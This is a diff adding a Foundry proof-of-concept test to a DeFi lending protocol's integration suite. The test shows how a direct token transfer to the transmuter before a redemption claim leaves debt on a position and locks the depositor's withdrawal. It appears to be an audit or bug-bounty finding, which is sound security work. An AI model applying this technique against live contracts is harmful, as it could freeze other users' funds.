@@ -925,4 +925,50 @@ contract IntegrationTest is Test {
             "Equity loss not approximately equal to protocol fee"
         );
     }
+
+    function test_claimRedemption_locked_POC() external {
+        deal(alUSD, address(0xdad), 0);
+        deal(alUSD, address(0xdead), 0);
+        uint256 amount = 100e18;
+        vm.startPrank(address(0xdad));
+        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
+        alchemist.deposit(amount, address(0xdad), 0);
+        // a single position nft would have been minted to 0xbeef
+        uint256 tokenIdFor0xDad = AlchemistNFTHelper.getFirstTokenId(address(0xdad), address(alchemistNFT));
+        alchemist.mint(tokenIdFor0xDad, ((amount *1e18)/ alchemist.minimumCollateralization()), address(0xdad));
+
+        SafeERC20.safeApprove(address(alUSD), address(transmuterLogic), alchemist.totalSyntheticsIssued());
+        transmuterLogic.createRedemption(IERC20(alUSD).balanceOf(address(0xdad)));
+        vm.roll(block.number + transmuterLogic.timeToTransmute());
+        alchemist.poke(tokenIdFor0xDad);
+        uint256 stateBefore = vm.snapshotState();
+        SafeERC20.safeTransfer(address(vault), address(transmuterLogic), 91e18);
+
+        transmuterLogic.claimRedemption(1);
+        // SafeERC20.safeTransfer(address(vault), address(transmuterLogic), 40e18);
+        uint256 cumulativeEarmark_After_Claim_With_Transfer=alchemist.cumulativeEarmarked();
+        uint256 totalDebt_After_Claim_With_Transfer=alchemist.totalDebt();
+        uint256 totalSyntheticsIssued_After_Claim_With_Transfer=alchemist.totalSyntheticsIssued();
+        vm.roll(block.number + 1);
+        vm.expectRevert(IllegalArgument.selector);
+        uint256 leave = 1e12; // smallest unit that becomes >=1 underlying “microunit” in convertToAssets
+        alchemist.withdraw(9.1e18 - leave, address(0xdad), tokenIdFor0xDad);
+        vm.revertTo(stateBefore);
+        transmuterLogic.claimRedemption(1);
+        uint256 cumulativeEarmark_After_Claim_Without_Transfer=alchemist.cumulativeEarmarked();
+        uint256 totalDebt_After_Claim_Without_Transfer=alchemist.totalDebt();
+        uint256 totalSyntheticsIssued_After_Claim_Without_Transfer=alchemist.totalSyntheticsIssued();
+
+        assertEq(cumulativeEarmark_After_Claim_Without_Transfer,0);
+        assertEq(totalDebt_After_Claim_Without_Transfer,0);
+        assertLt(totalSyntheticsIssued_After_Claim_With_Transfer, 1e12);
+        assertLt(totalSyntheticsIssued_After_Claim_Without_Transfer, 1e12);
+
+        assertEq(cumulativeEarmark_After_Claim_With_Transfer,90000000000000000009);
+        assertEq(totalDebt_After_Claim_With_Transfer,90000000000000000009);
+
+        vm.roll(block.number + 1);
+        alchemist.withdraw(9.1e18 - leave, address(0xdad), tokenIdFor0xDad);
+        vm.stopPrank();
+    }
 }
